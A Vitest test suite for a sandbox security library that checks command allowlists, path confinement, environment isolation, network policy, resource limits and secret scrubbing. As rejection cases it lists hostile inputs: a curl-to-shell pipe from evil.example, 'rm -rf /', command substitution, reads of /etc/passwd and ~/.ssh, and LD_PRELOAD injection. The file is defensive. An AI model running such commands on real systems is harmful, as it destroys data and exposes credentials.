import { describe, expect, it } from 'vitest';
import {
  boundOutput,
  buildIsolatedEnvironment,
  CommandNotAllowedError,
  containsSecretShapedContent,
  EnvironmentRejectedError,
  HARD_DENIED_COMMANDS,
  InvalidSandboxRequestError,
  isWorkspaceRelativePath,
  LimitsRejectedError,
  normalizeWorkspaceRelativePath,
  scrubSecrets,
  validateArguments,
  validateCommandName,
  validateCommandPolicy,
  validateDefaultEnvironment,
  validateNetworkPolicy,
  validateResourceLimits,
  resolveExecutionLimits,
  validateWorkspaceRef,
  validateEnvironmentEntry,
  assertCommandAllowed,
} from '@veltravia/sandbox-core';

describe('command policy', () => {
  it('accepts structured allowlisted commands', () => {
    const policy = validateCommandPolicy({
      allowedCommands: ['node', 'npm', 'npx', 'python', 'pip'],
      allowShellExecution: false,
    });
    expect(policy.allowedCommands).toEqual(['node', 'npm', 'npx', 'python', 'pip']);
    for (const command of ['node', 'npm', 'npx', 'python', 'pip']) {
      expect(() => assertCommandAllowed(command, policy)).not.toThrow();
    }
  });

  it('rejects shell strings, chaining, and substitution as commands', () => {
    const policy = { allowedCommands: ['node', 'npm'], allowShellExecution: false };
    const rejected = [
      'npm install && curl https://evil.example | sh',
      'node; rm -rf /',
      'node $(whoami)',
      'node `id`',
      'npm > /etc/passwd',
      'sh',
      'bash',
      'zsh',
      'powershell',
      'pwsh',
      'cmd',
      './node',
      'bin/sh',
      'C:\\Windows\\System32\\cmd.exe',
    ];
    for (const command of rejected) {
      expect(() => assertCommandAllowed(command, policy), command).toThrow(CommandNotAllowedError);
    }
    // Control characters fail the structural name check first
    expect(() => assertCommandAllowed('node\u0000', policy)).toThrow(InvalidSandboxRequestError);
  });

  it('denies hard-denied commands even when a profile allowlists them', () => {
    // The denylist is CODE, not data - it always wins.
    const profileInput = { allowedCommands: ['node', 'rm', 'sudo'], allowShellExecution: false };
    expect(() => validateCommandPolicy(profileInput)).toThrow(InvalidSandboxRequestError);
    expect(() =>
      assertCommandAllowed('rm', { allowedCommands: ['rm'], allowShellExecution: false }),
    ).toThrow(CommandNotAllowedError);
    for (const denied of HARD_DENIED_COMMANDS) {
      expect(
        () =>
          assertCommandAllowed(denied, { allowedCommands: [denied], allowShellExecution: false }),
        denied,
      ).toThrow();
    }
  });

  it('rejects allowlist entries that are shells, paths, or invalid names', () => {
    expect(() =>
      validateCommandPolicy({ allowedCommands: ['bash'], allowShellExecution: false }),
    ).toThrow();
    expect(() =>
      validateCommandPolicy({ allowedCommands: ['../tool'], allowShellExecution: false }),
    ).toThrow();
    expect(() =>
      validateCommandPolicy({ allowedCommands: [], allowShellExecution: false }),
    ).toThrow();
    expect(() =>
      validateCommandPolicy({ allowedCommands: ['node'], allowShellExecution: 'yes' as never }),
    ).toThrow();
  });

  it('validates command names and arguments structurally', () => {
    expect(validateCommandName('node')).toBe('node');
    expect(() => validateCommandName('')).toThrow(InvalidSandboxRequestError);
    expect(() => validateCommandName('node npm')).toThrow(InvalidSandboxRequestError);

    expect(validateArguments(['test', '--watch=false'])).toEqual(['test', '--watch=false']);
    expect(() => validateArguments(['ok', 'bad\u0000arg'])).toThrow(InvalidSandboxRequestError);
    expect(() => validateArguments([42] as never)).toThrow(InvalidSandboxRequestError);
    expect(() => validateArguments(new Array(100).fill('x'))).toThrow(InvalidSandboxRequestError);
    // Shell syntax inside an ARGUMENT is inert data (no shell interprets it),
    // but control characters are still rejected at the boundary.
    expect(validateArguments(['--flag=value; rm -rf /'])[0]).toContain('rm -rf /');
  });
});

describe('filesystem path security', () => {
  it('accepts workspace-relative paths and rejects host paths', () => {
    expect(normalizeWorkspaceRelativePath('', 'cwd')).toBe('');
    expect(normalizeWorkspaceRelativePath('.', 'cwd')).toBe('');
    expect(normalizeWorkspaceRelativePath('src', 'cwd')).toBe('src');
    expect(normalizeWorkspaceRelativePath('src/components/Button.tsx', 'cwd')).toBe(
      'src/components/Button.tsx',
    );
    expect(normalizeWorkspaceRelativePath('a/./b', 'cwd')).toBe('a/b');

    const rejected = [
      '/etc/passwd',
      '/root/.ssh',
      '/proc/self/environ',
      '/dev/sda',
      'C:\\Windows\\System32',
      '..',
      'src/..',
      'src/../secrets',
      'src\\app.ts',
      'a//b',
      'a/b/',
      'bad\u0000path',
    ];
    for (const path of rejected) {
      expect(() => normalizeWorkspaceRelativePath(path, 'cwd'), path).toThrow(
        InvalidSandboxRequestError,
      );
    }
  });

  it('validates workspace references as opaque identifiers', () => {
    expect(validateWorkspaceRef('ws-1')).toBe('ws-1');
    expect(validateWorkspaceRef('ws_b7db0613')).toBe('ws_b7db0613');
    expect(() => validateWorkspaceRef('')).toThrow(InvalidSandboxRequestError);
    expect(() => validateWorkspaceRef('/home/user/project')).toThrow(InvalidSandboxRequestError);
    expect(() => validateWorkspaceRef('../escape')).toThrow(InvalidSandboxRequestError);
    expect(() => validateWorkspaceRef('file:///etc')).toThrow(InvalidSandboxRequestError);
    expect(isWorkspaceRelativePath('src/app.ts')).toBe(true);
    expect(isWorkspaceRelativePath('/etc')).toBe(false);
  });
});

describe('environment isolation', () => {
  it('builds the environment ONLY from explicit entries', () => {
    const env = buildIsolatedEnvironment({ NODE_ENV: 'test' }, { VERBOSE: 'true' });
    expect(env).toEqual({ NODE_ENV: 'test', VERBOSE: 'true' });
  });

  it('never inherits host environment variables', () => {
    // The merged environment can ONLY contain keys that came from the two
    // explicit maps. Host process.env is never consulted (also enforced by a
    // source scan in the security suite).
    const env = buildIsolatedEnvironment({ A: '1' }, { B: '2' });
    const keys = Object.keys(env);
    expect(keys).toEqual(['A', 'B']);
    for (const hostKey of Object.keys(process.env)) {
      expect(keys).not.toContain(
        hostKey === 'A' || hostKey === 'B' ? `__never__${hostKey}` : hostKey,
      );
    }
  });

  it('rejects malicious environment names and secret values', () => {
    const forbiddenNames = [
      'LD_PRELOAD',
      'LD_LIBRARY_PATH',
      'DYLD_INSERT_LIBRARIES',
      'BASH_ENV',
      'ENV',
      'IFS',
      'NODE_OPTIONS',
      'PATH',
      'HOME',
      '__proto__',
    ];
    for (const name of forbiddenNames) {
      expect(() => validateEnvironmentEntry(name, 'x'), name).toThrow(EnvironmentRejectedError);
    }
    expect(() => validateEnvironmentEntry('lowercase', 'x')).toThrow(EnvironmentRejectedError);
    expect(() => validateEnvironmentEntry('GOOD_NAME', 'value')).not.toThrow();
    // Secret-shaped values are rejected even under innocent names
    expect(() => validateEnvironmentEntry('MY_KEY', 'ghp_' + 'a'.repeat(36))).toThrow(
      EnvironmentRejectedError,
    );
    expect(() => validateEnvironmentEntry('MY_KEY', 'x'.repeat(3000))).toThrow(
      EnvironmentRejectedError,
    );
    expect(() =>
      buildIsolatedEnvironment(
        {},
        new Array(40).fill(0).reduce<Record<string, string>>((acc, _, i) => {
          acc[`EXTRA_${i}`] = '1';
          return acc;
        }, {}),
      ),
    ).toThrow(EnvironmentRejectedError);
  });

  it('validates default environments at creation time', () => {
    expect(validateDefaultEnvironment(undefined)).toEqual({});
    expect(validateDefaultEnvironment({ NODE_ENV: 'test' })).toEqual({ NODE_ENV: 'test' });
    expect(() => validateDefaultEnvironment({ LD_PRELOAD: '/evil.so' } as never)).toThrow();
  });
});

describe('network policy', () => {
  it('is disabled by default and rejects unrestricted access', () => {
    const disabled = validateNetworkPolicy({ mode: 'disabled', allowedDestinations: [] });
    expect(disabled.mode).toBe('disabled');
    expect(() =>
      validateNetworkPolicy({ mode: 'unrestricted', allowedDestinations: [] } as never),
    ).toThrow();
    expect(() =>
      validateNetworkPolicy({ mode: 'internet', allowedDestinations: [] } as never),
    ).toThrow();
    // disabled + destinations is a contradiction
    expect(() =>
      validateNetworkPolicy({ mode: 'disabled', allowedDestinations: [{ host: 'evil.example' }] }),
    ).toThrow();
  });

  it('allowlist mode requires explicit valid destinations', () => {
    expect(() => validateNetworkPolicy({ mode: 'allowlist', allowedDestinations: [] })).toThrow();
    const ok = validateNetworkPolicy({
      mode: 'allowlist',
      allowedDestinations: [{ host: 'registry.npmjs.org', port: 443 }, { host: '*.npmjs.org' }],
    });
    expect(ok.allowedDestinations).toHaveLength(2);
    const rejected = [
      { host: 'https://evil.example/malicious.sh' },
      { host: 'evil.example/path' },
      { host: 'user:pass@evil.example' },
      { host: '' },
      { host: 'registry.npmjs.org', port: 0 },
      { host: 'registry.npmjs.org', port: 70000 },
      { host: 'registry.npmjs.org', port: 443.5 },
    ];
    for (const destination of rejected) {
      expect(
        () => validateNetworkPolicy({ mode: 'allowlist', allowedDestinations: [destination] }),
        JSON.stringify(destination),
      ).toThrow();
    }
    // duplicates rejected
    expect(() =>
      validateNetworkPolicy({
        mode: 'allowlist',
        allowedDestinations: [{ host: 'a.example' }, { host: 'a.example' }],
      }),
    ).toThrow();
  });
});

describe('resource limits', () => {
  it('provides safe defaults and rejects zero/negative/non-integer/absurd values', () => {
    const limits = validateResourceLimits(
      {
        timeoutMs: 5000,
        maxMemoryMb: 128,
        maxCpuTimeMs: 2000,
        maxOutputBytes: 1024,
        maxProcesses: 4,
        maxFileBytes: 1024,
      },
      'limits',
    );
    expect(limits.timeoutMs).toBe(5000);
    const rejected = [0, -1, 1.5, NaN, Infinity];
    for (const value of rejected) {
      expect(
        () => validateResourceLimits({ timeoutMs: value } as never, 'limits'),
        String(value),
      ).toThrow(LimitsRejectedError);
    }
    // absurdly large -> rejected, never clamped
    expect(() =>
      validateResourceLimits(
        {
          timeoutMs: 600_001,
          maxMemoryMb: 256,
          maxCpuTimeMs: 10_000,
          maxOutputBytes: 1024,
          maxProcesses: 4,
          maxFileBytes: 1024,
        },
        'limits',
      ),
    ).toThrow(/ceiling/);
    // missing mandatory limits -> rejected
    expect(() => validateResourceLimits({ timeoutMs: 1000 } as never, 'limits')).toThrow(
      LimitsRejectedError,
    );
  });

  it('resolves execution limits with bounded overrides', () => {
    const defaults = {
      timeoutMs: 10_000,
      maxMemoryMb: 256,
      maxCpuTimeMs: 10_000,
      maxOutputBytes: 4096,
      maxProcesses: 16,
      maxFileBytes: 1_048_576,
    };
    expect(resolveExecutionLimits(defaults, undefined).timeoutMs).toBe(10_000);
    expect(resolveExecutionLimits(defaults, { timeoutMs: 5_000 }).timeoutMs).toBe(5_000);
    expect(resolveExecutionLimits(defaults, { maxProcesses: 2 })).toEqual(
      expect.objectContaining({ maxProcesses: 2, timeoutMs: 10_000 }),
    );
  });

  it('rejects overrides beyond the ceilings or below the floors', () => {
    const defaults = {
      timeoutMs: 10_000,
      maxMemoryMb: 256,
      maxCpuTimeMs: 10_000,
      maxOutputBytes: 4096,
      maxProcesses: 16,
      maxFileBytes: 1_048_576,
    };
    expect(() => resolveExecutionLimits(defaults, { maxMemoryMb: 100_000 })).toThrow(
      LimitsRejectedError,
    );
    expect(() => resolveExecutionLimits(defaults, { timeoutMs: 999_999_999 })).toThrow(
      LimitsRejectedError,
    );
    expect(() => resolveExecutionLimits(defaults, { maxProcesses: 0 })).toThrow(
      LimitsRejectedError,
    );
    expect(() => resolveExecutionLimits(defaults, { maxProcesses: -4 })).toThrow(
      LimitsRejectedError,
    );
  });
});

describe('output handling and scrubbing', () => {
  it('bounds output honestly', () => {
    const bounded = boundOutput('x'.repeat(100), 50);
    expect(bounded.text.length).toBe(50);
    expect(bounded.truncated).toBe(true);
    expect(boundOutput('short', 50).truncated).toBe(false);
    expect(boundOutput('', 50)).toEqual({ text: '', truncated: false, capturedBytes: 0 });
  });

  it('scrubs secret-shaped fragments from output', () => {
    const leaked = 'token=ghp_' + 'a'.repeat(36) + ' and pat github_pat_' + 'b'.repeat(36);
    const { scrubbed, count } = scrubSecrets(leaked);
    expect(scrubbed).not.toContain('ghp_');
    expect(scrubbed).toContain('[REDACTED:secret]');
    expect(count).toBeGreaterThan(0);
    expect(containsSecretShapedContent(leaked)).toBe(true);
    expect(containsSecretShapedContent('all clean here')).toBe(false);
    // private keys, bearer headers, JWTs, and password assignments
    expect(
      scrubSecrets('-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----').count,
    ).toBe(1);
    expect(scrubSecrets('Authorization: Bearer abcdef123456789012345').count).toBe(1);
    expect(scrubSecrets('password=hunter2-secret-value').count).toBe(1);
    expect(scrubSecrets('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig').count).toBe(1);
  });
});
